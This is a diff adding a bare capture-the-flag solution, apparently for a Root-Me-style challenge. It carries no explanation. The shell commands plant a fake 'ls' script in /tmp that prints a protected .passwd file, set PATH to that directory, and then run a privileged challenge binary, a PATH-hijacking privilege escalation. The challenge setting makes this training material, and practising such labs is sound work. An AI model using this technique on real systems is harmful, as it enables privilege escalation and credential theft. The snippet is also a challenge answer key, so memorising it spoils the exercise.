@@ -1,0 +1,13 @@
+```shell
+cd /tmp
+mkdir Icemakr
+cd Icemakr
+cat > ls
+#!/bin/sh
+/bin/cat /challenge/app-script/ch12/.passwd
+```
+
+chmod +x ./ls
+export PATH="/tmp/Icemakr"
+/challenge/app-script/ch12/ch12
+```
